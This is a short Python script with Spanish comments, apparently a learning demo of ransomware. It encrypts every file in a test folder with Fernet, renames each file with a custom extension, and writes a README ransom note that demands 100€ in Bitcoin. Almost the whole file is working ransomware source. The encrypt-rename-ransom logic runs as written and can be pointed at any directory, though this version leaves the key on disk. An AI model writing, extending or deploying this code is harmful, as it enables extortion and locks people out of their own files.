from cryptography.fernet import Fernet
import os


# Extensión para los archivos encriptados.
extension = 'tiraquelibras'


# Función para generar la clave de cifrado y almacenada en un archivo en el directorio local.
def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)


# Función para obtener la clave de cifrado del archivo local.
def cargar_key():
    return open('key.key', 'rb').read()


# Función para encriptar los archivos y su renombramiento con la extensión personalizada.
def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()

        encrypted_data = f.encrypt(file_data)

        with open(item, 'wb') as file:
            file.write(encrypted_data)

        os.rename(item, item + '.' + extension)


if __name__ == '__main__':

    try:
        # Directorio que vamos a cifrar.
        path_to_encrypt = 'C:\\Users\\xxxxxx\\Documents\\Python Scripts\\Ransomware\\test_files\\'

        # Obtenemos los archivos del directorio a cifrar  los guardamos en una lista.
        items = os.listdir(path_to_encrypt)
        full_path = [path_to_encrypt + '\\' + item for item in items]

        # Generación la clave de cifrado y se almacena en una variable.
        generar_key()
        key = cargar_key()

        # Encriptación de los archivos listados.
        encrypt(full_path, key)

        # Mensaje para pedir el rescate guardado en el equipo atacado, normalmente en el escritorio.
        with open( path_to_encrypt + '\\README.txt', 'w') as file:
            file.write('Los archivos de su systemas han sido encryptados.n\Si quiere recuperar sus archivos realizar pago de 100€ a la direccion de Bitcoin:a0asdd90s788ds8ds78ffsfds89g')

    except Exception as e:
        print(e)



